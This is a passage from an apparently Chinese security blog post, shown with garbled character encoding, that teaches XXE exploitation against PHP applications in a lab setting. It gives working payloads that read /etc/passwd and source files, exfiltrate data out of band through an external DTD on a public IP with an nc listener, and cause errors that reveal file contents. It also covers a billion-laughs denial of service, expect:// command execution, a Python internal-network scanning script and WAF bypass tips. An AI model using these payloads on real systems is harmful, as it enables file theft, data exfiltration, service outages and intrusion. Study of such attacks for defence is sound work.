title="åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶"></a>åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="phpä¼ªåè®®è¯»å–æºç "><a href="#phpä¼ªåè®®è¯»å–æºç " class="headerlink" title="phpä¼ªåè®®è¯»å–æºç "></a>phpä¼ªåè®®è¯»å–æºç </h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=admin.php&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="ä¸å›æ˜¾æ¼æ´ä¿¡æ¯å¤–å¸¦ä¿¡æ¯"><a href="#ä¸å›æ˜¾æ¼æ´ä¿¡æ¯å¤–å¸¦ä¿¡æ¯" class="headerlink" title="ä¸å›æ˜¾æ¼æ´ä¿¡æ¯å¤–å¸¦ä¿¡æ¯"></a>ä¸å›æ˜¾æ¼æ´ä¿¡æ¯å¤–å¸¦ä¿¡æ¯</h3><p>test.xml(é¶åœºéœ€è¦ä¼ è¾“çš„xmlæ–‡ä»¶)</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://é¶æœºip/e.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></div><p>e.dtd</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file://è¯»å–æ–‡ä»¶è·¯å¾„&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://é¶æœºIP:ç›‘å¬ç«¯å£/?p=%file;&#x27;&gt;&quot;&gt;  &lt;!--`&amp;#x25;`æ˜¾ç¤ºä¸º`%`--&gt;</span><br></pre></td></tr></table></figure></div><p>åœ¨å†…éƒ¨DTDé‡Œï¼Œå‚æ•°å®ä½“å¼•ç”¨åªèƒ½å’Œå…ƒç´ åŒçº§è€Œä¸èƒ½ç›´æ¥å‡ºç°åœ¨å…ƒç´ å£°æ˜å†…éƒ¨ï¼Œå¦åˆ™è§£æå™¨ä¼šæŠ¥é”™<br>åœ¨ å¤–éƒ¨DTD æ–‡ä»¶ä¸­ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ‰èƒ½å¼•ç”¨å…¶ä»–å®ä½“</p><ul><li><p>%remoteè°ƒç”¨e.dtd  </p></li><li><p>%intåŠ è½½äº†fileï¼Œ%fileè·å–äº†flagæ–‡ä»¶å†…å®¹</p></li><li><p>%sendå°†æ•°æ®å‘é€åˆ°é¶æœºä¸Š</p></li></ul><p>%ä¸å…è®¸å‡ºç°åœ¨ Entityçš„valueä¸­ï¼Œæ‰€ä»¥éœ€è¦å°†%è¿›è¡ŒUnicodeç¼–ç ä¸º % æˆ–è€… %(è½¬åŒ–æˆUnicodeç¼–ç æœ‰ä¸¤ç§å½¢å¼ï¼Œä»¥&amp;#åæ¥åè¿›åˆ¶æ•°å­—ï¼Œ&amp;#xåæ¥åå…­è¿›åˆ¶æ•°å­—)</p><p>ä½¿ç”¨æœ¬åœ°php_xxeé¶åœº,å‘é€ä»¥ä¸‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://124.223.207.184/evil.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><blockquote><p>æ“ä½œè¿‡ç¨‹ï¼š</p><ul><li><p>åœ¨è‡ªå·±çš„vpsæˆ–äº‘æœåŠ¡å™¨ä¸Šå…ˆæ­å»ºç«™ç‚¹ï¼ˆä½¿ç”¨å®å¡”é¢æ¿æ­å»ºphpç«™ç‚¹ï¼Œç«¯å£ä»»æ„ï¼Œå¯ä»¥æ˜¯é»˜è®¤80,åŸŸåå†™:å…¬ç½‘ip:ç«¯å£ï¼‰</p></li><li><p>ç™»å½•äº‘æœåŠ¡å™¨ è…¾è®¯äº‘ä¸‹ç›®å½•ä¸º &#x2F;www&#x2F;wwwroot&#x2F;å…¬ç½‘ip åœ¨é‡Œé¢vimä¸€ä¸ªe.dtdï¼Œè¾“å…¥ä¸Šè¿°payload</p></li><li><p>æ³¨æ„é€‰æ‹©ç›‘å¬ç«¯å£ï¼Œé€‰æ‹©æ¯”è¾ƒåçš„ï¼Œæ²¡æœ‰æœåŠ¡è¿è¡Œçš„ï¼Œæ¯”å¦‚2333ï¼Œç„¶åè¦åœ¨äº‘æœåŠ¡å™¨æ§åˆ¶å°å’Œå®å¡”éƒ½æ”¾è¡Œè¯¥ç«¯å£ï¼Œé˜²ç«å¢™å¯å…³å¯ä¸å…³</p></li><li><p>äº‘æœåŠ¡å™¨æ‰§è¡Œç›‘å¬2333ç«¯å£:<code>nc -lvvp 2333</code></p></li><li><p>æœ¬æœºé¶åœºä¸Šå‘é€æ„é€ çš„xmlæ–‡ä»¶ï¼Œäº‘æœåŠ¡å™¨ç«¯ä¼šå›æ˜¾fileå‚æ•°å®ä½“å†…å®¹ï¼Œå³<code>php://filter/read=convert.base64-encode/resource=file://è¯»å–æ–‡ä»¶è·¯å¾„</code></p><p>âš ï¸è¸©è¿‡çš„å‘ï¼šåœ¨æ—¥å¿—ä¸­æŸ¥çœ‹å›æ˜¾ï¼ŒæœåŠ¡å™¨æ—¥å¿—(80ç«¯å£)ï¼Œä½†æºå¸¦flagçš„httpè¯·æ±‚æ˜¯è®¿é—®3344ç«¯å£çš„</p></li></ul></blockquote><h3 id="æŠ¥é”™è¾“å‡º"><a href="#æŠ¥é”™è¾“å‡º" class="headerlink" title="æŠ¥é”™è¾“å‡º"></a>æŠ¥é”™è¾“å‡º</h3><p>ç¯å¢ƒï¼š</p><ul><li>libxml&lt;&#x3D;2.8(2.9ä»¥åé»˜è®¤ä¸ä½¿ç”¨å¤–éƒ¨å®ä½“)</li><li>å¼€å¯äº†æŠ¥é”™</li><li>æ— å›æ˜¾</li></ul><p>payload1</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % a &#x27;</span><br><span class="line">&lt;!ENTITY &amp;#x25; b &quot;</span><br><span class="line">&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;</span><br><span class="line">&gt;</span><br><span class="line">&quot;&gt;</span><br><span class="line">&#x27;&gt;</span><br><span class="line">%a;</span><br><span class="line">%b;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;asfddasfd&lt;/message&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>nonexistentå¯æ›¿æ¢æˆä»»æ„æ ¹ç›®å½•ä¸‹ä¸å­˜åœ¨çš„æ–‡ä»¶å¤¹åç§°ï¼Œè¿™ä¹Ÿæ˜¯æŠ¥é”™çš„åŸå› ï¼šè¯»å–äº†ä¸å­˜åœ¨æ–‡ä»¶</p><p>fileå‚æ•°å®ä½“å†…å®¹å³ä¸ºæƒ³è¯»å–çš„æ–‡ä»¶å†…å®¹</p><p><code>&amp;#x27;</code> : <code>&#39;</code></p><p><code>&amp;#x25;</code> :<code>%</code></p><p><code>&amp;#x26;</code> :<code>&amp;</code></p></blockquote><p>payload2</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % condition &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">&#x27;&gt;</span><br><span class="line">    %condition;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;any text&lt;/message&gt;</span><br></pre></td></tr></table></figure></div><h3 id="DDos"><a href="#DDos" class="headerlink" title="DDos"></a><strong>DDos</strong></h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;abc&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>è¯¥æ”»å‡»é€šè¿‡åˆ›å»ºä¸€é¡¹é€’å½’çš„ XML å®šä¹‰ï¼Œåœ¨å†…å­˜ä¸­ç”Ÿæˆåäº¿ä¸ªâ€abcâ€å­—ç¬¦ä¸²ï¼Œä»è€Œå¯¼è‡´ DDoS æ”»å‡»ã€‚åŸç†ä¸ºï¼šæ„é€ æ¶æ„çš„XMLå®ä½“æ–‡ä»¶è€—å°½å¯ç”¨å†…å­˜ï¼Œå› ä¸ºè®¸å¤šXMLè§£æå™¨åœ¨è§£æXMLæ–‡æ¡£æ—¶å€¾å‘äºå°†å®ƒçš„æ•´ä¸ªç»“æ„ä¿ç•™åœ¨å†…å­˜ä¸­ï¼Œè§£æéå¸¸æ…¢ï¼Œé€ æˆäº†æ‹’ç»æœåŠ¡å™¨æ”»å‡»ã€‚</p><h4 id="PHP-expect-RCE"><a href="#PHP-expect-RCE" class="headerlink" title=".PHP expect RCE"></a><strong>.PHP expect RCE</strong></h4><p>ç”±äº PHP çš„ expect å¹¶ä¸æ˜¯é»˜è®¤å®‰è£…æ‰©å±•ï¼Œå¦‚æœå®‰è£…äº†è¿™ä¸ªexpect æ‰©å±•æˆ‘ä»¬å°±èƒ½ç›´æ¥åˆ©ç”¨ XXE è¿›è¡Œ RCE</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect://id&quot;&gt;]&gt;</span><br><span class="line">&lt;dir&gt;</span><br><span class="line">&lt;file&gt;&amp;cmd;&lt;/file&gt;</span><br><span class="line">&lt;/dir&gt;</span><br></pre></td></tr></table></figure></div><h3 id="HTTP-å†…ç½‘ä¸»æœºæ¢æµ‹"><a href="#HTTP-å†…ç½‘ä¸»æœºæ¢æµ‹" class="headerlink" title="HTTP å†…ç½‘ä¸»æœºæ¢æµ‹"></a><strong>HTTP å†…ç½‘ä¸»æœºæ¢æµ‹</strong></h3><p>æ¢æµ‹è„šæœ¬</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#Origtional XML that the server accepts</span></span><br><span class="line"><span class="comment">#&lt;xml&gt;</span></span><br><span class="line"><span class="comment">#    &lt;stuff&gt;user&lt;/stuff&gt;</span></span><br><span class="line"><span class="comment">#&lt;/xml&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_xml</span>(<span class="params">string</span>):</span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="string">&#x27;&quot;&#x27;</span> + string + <span class="string">&#x27;&quot;&#x27;</span> + <span class="string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span></span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_xml</span>(<span class="params">xml</span>):</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/xml&#x27;</span>&#125;</span><br><span class="line">    x = requests.post(<span class="string">&#x27;http://é¶æœºip/CUSTOM/NEW_XEE.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="number">5</span>).text</span><br><span class="line">    coded_string = x.split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">2</span>] <span class="comment"># a little split to get only the base64 encoded value</span></span><br><span class="line">    <span class="built_in">print</span> coded_string</span><br><span class="line"><span class="comment">#   print base64.b64decode(coded_string)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = <span class="built_in">str</span>(i)</span><br><span class="line">        ip = <span class="string">&#x27;10.0.0.&#x27;</span> + i</span><br><span class="line">        string = <span class="string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div><blockquote><p>è¦è¿›è¡Œå†…ç½‘æ¢æµ‹æˆ‘ä»¬è¿˜éœ€è¦åšä¸€äº›å‡†å¤‡å·¥ä½œï¼Œæˆ‘ä»¬éœ€è¦å…ˆåˆ©ç”¨ file åè®®è¯»å–æˆ‘ä»¬ä½œä¸ºæ”¯ç‚¹æœåŠ¡å™¨çš„ç½‘ç»œé…ç½®æ–‡ä»¶ï¼Œçœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰å†…ç½‘ï¼Œä»¥åŠç½‘æ®µå¤§æ¦‚æ˜¯ä»€ä¹ˆæ ·å­ã€‚æˆ‘ä»¬å¯ä»¥å°è¯•è¯»å– &#x2F;etc&#x2F;network&#x2F;interfaces æˆ–è€… &#x2F;proc&#x2F;net&#x2F;arp æˆ–è€… &#x2F;etc&#x2F;host æ–‡ä»¶</p></blockquote><h3 id="HTTP-å†…ç½‘ä¸»æœºç«¯å£æ‰«æ"><a href="#HTTP-å†…ç½‘ä¸»æœºç«¯å£æ‰«æ" class="headerlink" title="HTTP å†…ç½‘ä¸»æœºç«¯å£æ‰«æ"></a><strong>HTTP å†…ç½‘ä¸»æœºç«¯å£æ‰«æ</strong></h3><p>åˆ©ç”¨burpsuiteè¾…åŠ©</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://127.0.0.1:ç«¯å£å·/&quot; [  </span><br><span class="line">&lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>ç«¯å£å·éƒ¨åˆ†ç”¨bpçˆ†ç ´</p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»æœ‰èƒ½åŠ›å¯¹æ•´ä¸ªç½‘æ®µè¿›è¡Œäº†ä¸€ä¸ªå…¨é¢çš„æ¢æµ‹,å¹¶èƒ½å¾—åˆ°å†…ç½‘æœåŠ¡å™¨çš„ä¸€äº›ä¿¡æ¯äº†ï¼Œå¦‚æœå†…ç½‘çš„æœåŠ¡å™¨æœ‰æ¼æ´ï¼Œå¹¶ä¸”æ°å¥½åˆ©ç”¨æ–¹å¼åœ¨æœåŠ¡å™¨æ”¯æŒçš„åè®®çš„èŒƒå›´å†…çš„è¯ï¼Œæˆ‘ä»¬å°±èƒ½ç›´æ¥åˆ©ç”¨ XXE æ‰“å‡»å†…ç½‘æœåŠ¡å™¨ç”šè‡³èƒ½ç›´æ¥ getshellï¼ˆæ¯”å¦‚æœ‰äº› å†…ç½‘çš„æœªæˆæƒ redis æˆ–è€…æœ‰äº›é€šè¿‡ http get è¯·æ±‚å°±èƒ½ç›´æ¥getshell çš„ æ¯”å¦‚ strus2ï¼‰</p></blockquote><h3 id="å†…ç½‘ç›²æ³¨"><a href="#å†…ç½‘ç›²æ³¨" class="headerlink" title="å†…ç½‘ç›²æ³¨"></a>å†…ç½‘ç›²æ³¨</h3><blockquote><p>è¿™é‡Œæœ‰ä¸€ä¸ªå°æŠ€å·§ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ libxml è¯»å–æ–‡ä»¶å†…å®¹çš„æ—¶å€™ï¼Œæ–‡ä»¶ä¸èƒ½è¿‡å¤§ï¼Œå¦‚æœå¤ªå¤§å°±ä¼šæŠ¥é”™ï¼Œäºæ˜¯æˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨ php<br>è¿‡æ»¤å™¨çš„ä¸€ä¸ªå‹ç¼©çš„æ–¹æ³•</p><p>å‹ç¼©ï¼šecho file_get_contents(â€œphp:&#x2F;&#x2F;filter&#x2F;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwdâ€);<br>è§£å‹ï¼šecho file_get_contents(â€œphp:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-decode&#x2F;zlib.inflate&#x2F;resource&#x3D;&#x2F;tmp&#x2F;1â€);</p></blockquote><p>æˆ‘ä»¬è€ƒè™‘å†…ç½‘æœ‰æ²¡æœ‰ä¸œè¥¿ï¼Œæˆ‘ä»¬è¯»å–</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc/net/arp</span><br><span class="line">/etc/host</span><br></pre></td></tr></table></figure></div><h3 id="WAFç»•è¿‡"><a href="#WAFç»•è¿‡" class="headerlink" title="WAFç»•è¿‡"></a>WAFç»•è¿‡</h3><h4 id="é’ˆå¯¹çš„WAF"><a href="#é’ˆå¯¹çš„WAF" class="headerlink" title="é’ˆå¯¹çš„WAF"></a>é’ˆå¯¹çš„WAF</h4><p>1.æˆç†Ÿçš„wafâ€”â€”ä½¿ç”¨è‡ªå·±çš„è§£æå™¨é¢„å¤„ç†XMLæ–‡æ¡£çš„WAFsã€‚<br>2.åŸºäºæ­£åˆ™è¡¨è¾¾å¼ã€‚ä»…æœç´¢æ•°æ®ä¸­çš„ç‰¹å®šå­å­—ç¬¦ä¸²æˆ–æ­£åˆ™è¡¨è¾¾å¼çš„WAFSã€‚</p><h4 id="é¢å¤–ç©ºæ ¼"><a href="#é¢å¤–ç©ºæ ¼" class="headerlink" title="é¢å¤–ç©ºæ ¼"></a>é¢å¤–ç©ºæ ¼</h4><p>ç”±äºXXEé€šå¸¸åœ¨XMLæ–‡æ¡£çš„å¼€å¤´ï¼Œæ‰€ä»¥æ¯”è¾ƒçœäº‹å„¿çš„WAFå¯ä»¥é¿å…å¤„ç†æ•´ä¸ªæ–‡æ¡£ï¼Œè€Œåªè§£æå®ƒçš„å¼€å¤´ã€‚ä½†æ˜¯ï¼ŒXMLæ ¼å¼å…è®¸åœ¨æ ¼å¼åŒ–æ ‡è®°å±æ€§æ—¶ä½¿ç”¨<u>ä»»æ„æ•°é‡çš„ç©ºæ ¼</u>ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥åœ¨<code>&lt;?xml?&gt;</code>æˆ–<code>&lt;!DOCTYPE&gt;</code>ä¸­æ’å…¥é¢å¤–çš„ç©ºæ ¼ï¼Œä»è€Œç»•è¿‡æ­¤ç±»WAFã€‚</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407040003137.jpg"                      alt="image-20220501154908744"                ><figcaption>image-20220501154908744</figcaption></figure></p><h4 id="æ ¼å¼æ— æ•ˆ-é“¾æ¥åˆ°æœªçŸ¥å®ä½“"><a href="#æ ¼å¼æ— æ•ˆ-é“¾æ¥åˆ°æœªçŸ¥å®ä½“" class="headerlink" title="æ ¼å¼æ— æ•ˆ(é“¾æ¥åˆ°æœªçŸ¥å®ä½“)"></a>æ ¼å¼æ— 